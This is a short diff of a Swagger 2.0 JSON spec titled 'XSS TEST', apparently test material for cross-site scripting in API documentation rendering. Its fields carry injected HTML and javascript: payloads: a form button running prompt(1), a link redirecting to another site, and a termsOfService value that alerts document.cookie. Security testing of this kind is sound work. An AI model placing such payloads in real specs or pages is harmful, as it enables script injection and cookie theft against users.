@@ -2,7 +2,7 @@
   "swagger": "2.0",
   "info": 
   {"title": "XSS TEST",
-  "description": "</p><form id='test'></form><button form='test' formaction='javascript:prompt(1)'>TESTESTESTSETSESETSET</button><p>",
+  "description": "</p><a href='javascript:location.replace('https://www.naver.com')'>link test</a><p>",
   "termsOfService": "javascript:alert(document.cookie)"},
   "contact": 
   {"name": "AHNLAB",
